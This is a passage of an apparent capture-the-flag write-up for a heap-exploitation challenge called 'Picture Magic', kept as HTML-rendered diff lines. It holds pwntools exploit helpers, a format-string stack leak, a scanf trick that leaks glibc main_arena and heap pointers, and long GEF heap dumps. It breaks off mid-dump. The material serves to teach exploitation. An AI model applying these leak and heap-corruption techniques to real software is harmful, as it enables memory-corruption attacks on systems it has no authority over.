+<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">show</span><span class="mtk1">(</span><span class="mtk9 mtki">index</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">) -&gt; </span><span class="mtk8 mtku">bytes</span><span class="mtk1">:</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'-&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'3'</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Picture index: '</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk9 mtki">index</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'================================</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'================================</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">, </span><span class="mtk9 mtki">drop</span><span class="mtk5">=</span><span class="mtk6">True</span><span class="mtk1">)</span>
+
+
+<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">sell</span><span class="mtk1">(</span><span class="mtk9 mtki">index</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">, </span><span class="mtk9 mtki">price</span><span class="mtk1">: </span><span class="mtk8 mtku">bytes</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'0'</span><span class="mtk1">, </span><span class="mtk9 mtki">yn</span><span class="mtk1">: </span><span class="mtk8 mtku">bytes</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'y'</span><span class="mtk1">) -&gt; </span><span class="mtk8 mtku">bytes</span><span class="mtk1">:</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'-&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'4'</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Picture index: '</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk9 mtki">index</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'How much do you want to sell the picture for? '</span><span class="mtk1">, </span><span class="mtk9 mtki">price</span><span class="mtk1">)</span>
+
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk9 mtki">price</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'0'</span><span class="mtk1">:</span>
+<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">''</span>
+
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Picture is put up for sale at the price of $'</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">sale</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'.'</span><span class="mtk1">, </span><span class="mtk9 mtki">drop</span><span class="mtk5">=</span><span class="mtk6">True</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Do you want to throw it away instead? (y/N) '</span><span class="mtk1">, </span><span class="mtk9 mtki">yn</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">sale</span>
+
+
+<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">change</span><span class="mtk1">(</span><span class="mtk9 mtki">name</span><span class="mtk1">: </span><span class="mtk8 mtku">bytes</span><span class="mtk1">):</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'-&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'5'</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'New artist name: '</span><span class="mtk1">, </span><span class="mtk9 mtki">name</span><span class="mtk1">)</span>
+</code></pre></div><h3 id="leaking-memory-addresses">Leaking memory addresses</h3><p>The first leak we can get is the stack address leak, and find the position of <code>name</code> using relative offsets:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">():</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Before creating your masterpiece, please enter yo</span><span class="mtk4">ur artist name:'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'asdf'</span><span class="mtk1">)</span>  
+
+<span class="mtk1">    </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">)</span>
+
+<span class="mtk1">    </span><span class="mtk1">name_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk8">sell</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'%p'</span><span class="mtk1">).</span><span class="mtk8">decode</span><span class="mtk1">(), </span><span class="mtk6">16</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">2160</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">info</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Name address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">name_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>
+</code></pre></div><p>Next, there is a hidden way to leak Glibc and heap pointers. Remember <code>create_picture</code>, actually, this piece of code:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"Width: "</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk6">7</span><span class="mtk1">, stdout);</span>
+<span class="mtk1">    </span><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%u</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">p-&gt;width);</span>
+<span class="mtk1">    </span><span class="mtk8">getchar</span><span class="mtk1">();</span>
+<span class="mtk1">    </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"Height: "</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk6">8</span><span class="mtk1">, stdout);</span>
+<span class="mtk1">    </span><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%u</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">p-&gt;height);</span>
+<span class="mtk1">    </span><span class="mtk8">getchar</span><span class="mtk1">();</span>
+
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (((p-&gt;height </span><span class="mtk5">*</span><span class="mtk1"> p-&gt;width </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">4f1</span><span class="mtk1">) </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> (p-&gt;width </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">4f1</span><span class="mtk1">)) </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> (p-&gt;height </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">4f1</span><span class="mtk1">)) {</span>
+<span class="mtk1">      </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">Reading picture into buffer:"</span><span class="mtk1">);</span>
+<span class="mtk1">      </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"================================"</span><span class="mtk1">);</span>
+<span class="mtk1">      </span><span class="mtk8">read_picture</span><span class="mtk1">(p);</span>
+<span class="mtk1">      </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"================================"</span><span class="mtk1">);</span>
+<span class="mtk1">      </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Successfully read picture!</span><span class="mtk6">\n</span><span class="mtk4">Picture has been assigned index </span><span class="mtk6">%d</span><span class="mtk4">.</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, index);</span>  
+<span class="mtk1">      pictures[index] </span><span class="mtk5">=</span><span class="mtk1"> p;</span>
+<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">      </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">Chosen size of (</span><span class="mtk6">%u</span><span class="mtk4">, </span><span class="mtk6">%u</span><span class="mtk4">) cannot be used!</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, p-&gt;width, p-&gt;height);</span>
+<span class="mtk1">      </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Picture must not exceed </span><span class="mtk6">%d</span><span class="mtk4"> bytes!</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">4f0</span><span class="mtk1">);</span>
+<span class="mtk1">      </span><span class="mtk8">free</span><span class="mtk1">(p);</span>
+<span class="mtk1">    }</span>
+</code></pre></div><p>If the picture size does not meet the condition, an error will be printed out. The relevant thing is that the values of <code>p->width</code> and <code>p->height</code> are still shown in the error. Therefore, if we simply write any letter in <code>scanf</code>, nothing will change in <code>p->width</code> and <code>p->height</code> fields. So, imagine that we are overwriting a freed chunk, we would have and <code>fd</code> pointer to <code>main_arena</code> (let&rsquo;s say <code>0x7ffff7df6cc0</code>). This means that <code>p->height = 0x7fff</code> and <code>p->width = 0xf7df6cc0</code>, and that way we can get a leak. Same example as before:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>chunks
+<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x55555555c000</span>, size=<span class="code-magenta">0x290</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=0x00055555555c, bk=0x000000000000)
+<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x55555555c290</span>, size=<span class="code-magenta">0x500</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-green">0x7ffff7df6cc0</span>, bk=<span class="code-dark-green">0x7ffff7df6cc0</span>)<span class="code-blue">  &lt;-  unsortedbins[1/1]</span>
+<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x55555555c790</span>, size=<span class="code-magenta">0x500</span>, flags=, fd=0x00055555555c, bk=0x000000000000)
+<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x55555555cc90</span>, size=<span class="code-magenta">0x20370</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=0x00055555555c, bk=0x000000000000) <span class="code-blue"> &lt;-  top</span>
+<span class="code-green">gef&gt; </span>bins
+<span class="code-dark-cyan">------------------------------------------------------------- Tcachebins for arena 'main_arena' -------------------------------------------------------------</span>  
+<span class="code-blue">[+]</span> Found 0 chunks in tcache.
+<span class="code-dark-cyan">-------------------------------------------------------------- Fastbins for arena 'main_arena' --------------------------------------------------------------</span>
+<span class="code-blue">[+]</span> Found 0 chunks in fastbin.
+<span class="code-dark-cyan">------------------------------------------------------------ Unsorted Bin for arena 'main_arena' ------------------------------------------------------------</span>
+unsorted_bins[idx=0, size=any, @<span class="code-dark-green">0x7ffff7df6cd0</span>]: fd=<span class="code-dark-blue">0x55555555c290</span>, bk=<span class="code-dark-blue">0x55555555c290</span>
+ -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x55555555c290</span>, size=<span class="code-magenta">0x500</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-green">0x7ffff7df6cc0</span>, bk=<span class="code-dark-green">0x7ffff7df6cc0</span>)
+<span class="code-blue">[+]</span> Found 1 chunks in unsorted bin.
+<span class="code-dark-cyan">------------------------------------------------------------- Small Bins for arena 'main_arena' -------------------------------------------------------------</span>
+<span class="code-blue">[+]</span> Found 0 chunks in 0 small non-empty bins.
+<span class="code-dark-cyan">------------------------------------------------------------- Large Bins for arena 'main_arena' -------------------------------------------------------------</span>
+<span class="code-blue">[+]</span> Found 0 chunks in 0 large non-empty bins.
+<span class="code-green">gef&gt; </span>visual-heap
+<span class="code-dark-red">0x55555555c000: 0x0000000000000000 0x0000000000000291 | ................ |</span>
+<span class="code-dark-red">0x55555555c010: 0x0000000000000000 0x0000000000000000 | ................ |</span>
+<span class="code-dark-red">* 39 lines, 0x270 bytes</span>
+<span class="code-dark-green">0x55555555c290: 0x0000000000000000 0x0000000000000501 | ................ |  &lt;-  unsortedbins[1/1]</span>
+<span class="code-dark-green">0x55555555c2a0: 0x00007ffff7df6cc0 0x00007ffff7df6cc0 | .l.......l...... |</span>
+<span class="code-dark-green">0x55555555c2b0: 0x0000000000000000 0x0000000000000000 | ................ |</span>
+<span class="code-dark-green">* 77 lines, 0x4d0 bytes</span>
+<span class="code-dark-blue">0x55555555c790: 0x0000000000000500 0x0000000000000500 | ................ |</span>
+<span class="code-dark-blue">0x55555555c7a0: 0x0000000000000000 0x0000000000000000 | ................ |</span>
+<span class="code-dark-blue">* 78 lines, 0x4e0 bytes</span>
+<span class="code-dark-yellow">0x55555555cc90: 0x0000000000000000 0x0000000000020371 | ........q....... |  &lt;-  top</span>
+<span class="code-dark-yellow">0x55555555cca0: 0x0000000000000000 0x0000000000000000 | ................ |</span>
+<span class="code-dark-yellow">* 8245 lines, 0x20350 bytes</span>
+</code></pre></div><p>Now we try to create another picture and write letters instead of numbers:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>continue
+Continuing.
+1
+
+Width: a
+Height: a
+
+Chosen size of (4158614720, 32767) cannot be used!  
+Picture must not exceed 1264 bytes!
+
++------------------------------+
+|         Picture Magic        |
++------------------------------+
+| 1. Create picture            |
+| 2. Transform picture         |
+| 3. Show picture              |
+| 4. Sell picture              |
+| 5. Change artist name        |
+| 6. Exit                      |
++------------------------------+
+-&gt; ^C
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>p/x 4158614720ul | (32767ul &lt;&lt; 32)
+$1 = 0x7ffff7df6cc0
+<span class="code-green">gef&gt; </span>x/gx 4158614720ul | (32767ul &lt;&lt; 32)
+<span class="code-dark-blue">0x7ffff7df6cc0</span> &lt;<span class="code-dark-yellow">main_arena</span>+96&gt;: 0x000055555555cc90  
+</code></pre></div><p>Similarly, we can get a heap address, but we need to have another Unsorted Bin chunk that is consolidated with the top chunk, so that the information of the <code>fd</code> pointer is not overwritten. For this, we can do the following:</p><ul><li>Allocate all 4 pictures (<code>0</code>, <code>1</code>, <code>2</code> and <code>3</code>)</li></ul><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>chunks
+<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x55555555c000</span>, size=<span class="code-magenta">0x290</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=0x00055555555c, bk=0x000000000000)
+<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x55555555c290</span>, size=<span class="code-magenta">0x500</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=0x00055555555c, bk=0x000000000000)
+<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x55555555c790</span>, size=<span class="code-magenta">0x500</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=0x00055555555c, bk=0x000000000000)
+<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x55555555cc90</span>, size=<span class="code-magenta">0x500</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=0x00055555555c, bk=0x000000000000)
+<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x55555555d190</span>, size=<span class="code-magenta">0x500</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=0x00055555555d, bk=0x000000000000)
+<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x55555555d690</span>, size=<span class="code-magenta">0x1f970</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=0x00055555555d, bk=0x000000000000) <span class="code-blue"> &lt;-  top</span>
+<span class="code-green">gef&gt; </span>bins
+<span class="code-dark-cyan">------------------------------------------------------------- Tcachebins for arena 'main_arena' -------------------------------------------------------------</span>  
+<span class="code-blue">[+]</span> Found 0 chunks in tcache.
+<span class="code-dark-cyan">-------------------------------------------------------------- Fastbins for arena 'main_arena' --------------------------------------------------------------</span>
+<span class="code-blue">[+]</span> Found 0 chunks in fastbin.
+<span class="code-dark-cyan">------------------------------------------------------------ Unsorted Bin for arena 'main_arena' ------------------------------------------------------------</span>
+<span class="code-blue">[+]</span> Found 0 chunks in unsorted bin.
+<span class="code-dark-cyan">------------------------------------------------------------- Small Bins for arena 'main_arena' -------------------------------------------------------------</span>
+<span class="code-blue">[+]</span> Found 0 chunks in 0 small non-empty bins.
+<span class="code-dark-cyan">------------------------------------------------------------- Large Bins for arena 'main_arena' -------------------------------------------------------------</span>
+<span class="code-blue">[+]</span> Found 0 chunks in 0 large non-empty bins.
+<span class="code-green">gef&gt; </span>visual-heap
+<span class="code-dark-red">0x55555555c000: 0x0000000000000000 0x0000000000000291 | ................ |</span>
+<span class="code-dark-red">0x55555555c010: 0x0000000000000000 0x0000000000000000 | ................ |</span>
+<span class="code-dark-red">* 39 lines, 0x270 bytes</span>
+<span class="code-dark-green">0x55555555c290: 0x0000000000000000 0x0000000000000501 | ................ |</span>
+<span class="code-dark-green">0x55555555c2a0: 0x0000000000000000 0x0000000000000000 | ................ |</span>
+<span class="code-dark-green">* 78 lines, 0x4e0 bytes</span>
+<span class="code-dark-blue">0x55555555c790: 0x0000000000000000 0x0000000000000501 | ................ |</span>
+<span class="code-dark-blue">0x55555555c7a0: 0x0000000000000000 0x0000000000000000 | ................ |</span>
+<span class="code-dark-blue">* 78 lines, 0x4e0 bytes</span>
+<span class="code-dark-yellow">0x55555555cc90: 0x0000000000000000 0x0000000000000501 | ................ |</span>
+<span class="code-dark-yellow">0x55555555cca0: 0x0000000000000000 0x0000000000000000 | ................ |</span>
+<span class="code-dark-yellow">* 78 lines, 0x4e0 bytes</span>
+<span class="code-dark-red">0x55555555d190: 0x0000000000000000 0x0000000000000501 | ................ |</span>
+<span class="code-dark-red">0x55555555d1a0: 0x0000000000000000 0x0000000000000000 | ................ |</span>
+<span class="code-dark-red">* 78 lines, 0x4e0 bytes</span>
+<span class="code-dark-green">0x55555555d690: 0x0000000000000000 0x000000000001f971 | ........q....... |  &lt;-  top</span>
+<span class="code-dark-green">0x55555555d6a0: 0x0000000000000000 0x0000000000000000 | ................ |</span>
+<span class="code-dark-green">* 8085 lines, 0x1f950 bytes</span>
+</code></pre></div><ul><li>Sell <code>0</code> (stack leak) <code>2</code> and <code>3</code></li></ul><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>chunks
+<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x55555555c000</span>, size=<span class="code-magenta">0x290</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=0x00055555555c, bk=0x000000000000)
+<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x55555555c290</span>, size=<span class="code-magenta">0x500</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-green">0x7ffff7df6cc0</span>, bk=<span class="code-dark-green">0x7ffff7df6cc0</span>)<span class="code-blue">  &lt;-  unsortedbins[1/1]</span>
+<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x55555555c790</span>, size=<span class="code-magenta">0x500</span>, flags=, fd=0x00055555555c, bk=0x000000000000)
+<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x55555555cc90</span>, size=<span class="code-magenta">0x20370</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-blue">0x55555555c290</span>, bk=<span class="code-dark-green">0x7ffff7df6cc0</span>) <span class="code-blue"> &lt;-  top</span>
+<span class="code-green">gef&gt; </span>bins
+<span class="code-dark-cyan">------------------------------------------------------------- Tcachebins for arena 'main_arena' -------------------------------------------------------------</span>  
+<span class="code-blue">[+]</span> Found 0 chunks in tcache.
+<span class="code-dark-cyan">-------------------------------------------------------------- Fastbins for arena 'main_arena' --------------------------------------------------------------</span>
+<span class="code-blue">[+]</span> Found 0 chunks in fastbin.
+<span class="code-dark-cyan">------------------------------------------------------------ Unsorted Bin for arena 'main_arena' ------------------------------------------------------------</span>
+unsorted_bins[idx=0, size=any, @<span class="code-dark-green">0x7ffff7df6cd0</span>]: fd=<span class="code-dark-blue">0x55555555c290</span>, bk=<span class="code-dark-blue">0x55555555c290</span>
+ -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x55555555c290</span>, size=<span class="code-magenta">0x500</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-green">0x7ffff7df6cc0</span>, bk=<span class="code-dark-green">0x7ffff7df6cc0</span>)
+<span class="code-blue">[+]</span> Found 1 chunks in unsorted bin.
+<span class="code-dark-cyan">------------------------------------------------------------- Small Bins for arena 'main_arena' -------------------------------------------------------------</span>
+<span class="code-blue">[+]</span> Found 0 chunks in 0 small non-empty bins.
+<span class="code-dark-cyan">------------------------------------------------------------- Large Bins for arena 'main_arena' -------------------------------------------------------------</span>
+<span class="code-blue">[+]</span> Found 0 chunks in 0 large non-empty bins.
+<span class="code-green">gef&gt; </span>visual-heap
+<span class="code-dark-red">0x55555555c000: 0x0000000000000000 0x0000000000000291 | ................ |</span>
+<span class="code-dark-red">0x55555555c010: 0x0000000000000000 0x0000000000000000 | ................ |</span>
+<span class="code-dark-red">* 39 lines, 0x270 bytes</span>
+<span class="code-dark-green">0x55555555c290: 0x0000000000000000 0x0000000000000501 | ................ |  &lt;-  unsortedbins[1/1]</span>
+<span class="code-dark-green">0x55555555c2a0: 0x00007ffff7df6cc0 0x00007ffff7df6cc0 | .l.......l...... |</span>
+<span class="code-dark-green">0x55555555c2b0: 0x0000000000000000 0x0000000000000000 | ................ |</span>
+<span class="code-dark-green">* 77 lines, 0x4d0 bytes</span>
+<span class="code-dark-blue">0x55555555c790: 0x0000000000000500 0x0000000000000500 | ................ |</span>
+<span class="code-dark-blue">0x55555555c7a0: 0x0000000000000000 0x0000000000000000 | ................ |</span>
+<span class="code-dark-blue">* 78 lines, 0x4e0 bytes</span>
+<span class="code-dark-yellow">0x55555555cc90: 0x0000000000000000 0x0000000000020371 | ........q....... |  &lt;-  top</span>
+<span class="code-dark-yellow">0x55555555cca0: 0x000055555555c290 0x00007ffff7df6cc0 | ..UUUU...l...... |</span>
+<span class="code-dark-yellow">0x55555555ccb0: 0x0000000000000000 0x0000000000000000 | ................ |</span>
+<span class="code-dark-yellow">* 77 lines, 0x4d0 bytes</span>
+<span class="code-dark-yellow">0x55555555d190: 0x0000000000000500 0x0000000000000500 | ................ |</span>
+<span class="code-white">...</span>
+</code></pre></div><ul><li>Allocate another picture</li></ul><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>chunks
+<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x55555555c000</span>, size=<span class="code-magenta">0x290</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=0x00055555555c, bk=0x000000000000)
+<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x55555555c290</span>, size=<span class="code-magenta">0x500</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=0x00055555555c, bk=<span class="code-dark-green">0x7ffff7df6c00</span>)
+<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x55555555c790</span>, size=<span class="code-magenta">0x500</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=0x00055555555c, bk=0x000000000000)
+<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x55555555cc90</span>, size=<span class="code-magenta">0x20370</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-blue">0x55555555c290</span>, bk=<span class="code-dark-green">0x7ffff7df6cc0</span>) <span class="code-blue"> &lt;-  top</span>
+<span class="code-green">gef&gt; </span>bins
+<span class="code-dark-cyan">------------------------------------------------------------- Tcachebins for arena 'main_arena' -------------------------------------------------------------</span>  
+<span class="code-blue">[+]</span> Found 0 chunks in tcache.
+<span class="code-dark-cyan">-------------------------------------------------------------- Fastbins for arena 'main_arena' --------------------------------------------------------------</span>
+<span class="code-blue">[+]</span> Found 0 chunks in fastbin.
+<span class="code-dark-cyan">------------------------------------------------------------ Unsorted Bin for arena 'main_arena' ------------------------------------------------------------</span>
+<span class="code-blue">[+]</span> Found 0 chunks in unsorted bin.
+<span class="code-dark-cyan">------------------------------------------------------------- Small Bins for arena 'main_arena' -------------------------------------------------------------</span>
+<span class="code-blue">[+]</span> Found 0 chunks in 0 small non-empty bins.
+<span class="code-dark-cyan">------------------------------------------------------------- Large Bins for arena 'main_arena' -------------------------------------------------------------</span>
+<span class="code-blue">[+]</span> Found 0 chunks in 0 large non-empty bins.
+<span class="code-green">gef&gt; </span>visual-heap
+<span class="code-dark-red">0x55555555c000: 0x0000000000000000 0x0000000000000291 | ................ |</span>
+<span class="code-dark-red">0x55555555c010: 0x0000000000000000 0x0000000000000000 | ................ |</span>
+<span class="code-dark-red">* 39 lines, 0x270 bytes</span>
+<span class="code-dark-green">0x55555555c290: 0x0000000000000000 0x0000000000000501 | ................ |</span>
+<span class="code-dark-green">0x55555555c2a0: 0x0000000000000000 0x00007ffff7df6c00 | .........l...... |</span>
+<span class="code-dark-green">0x55555555c2b0: 0x0000000000000000 0x0000000000000000 | ................ |</span>
+<span class="code-dark-green">* 77 lines, 0x4d0 bytes</span>
+<span class="code-dark-blue">0x55555555c790: 0x0000000000000500 0x0000000000000501 | ................ |</span>
+<span class="code-dark-blue">0x55555555c7a0: 0x0000000000000000 0x0000000000000000 | ................ |</span>
+<span class="code-dark-blue">* 78 lines, 0x4e0 bytes</span>
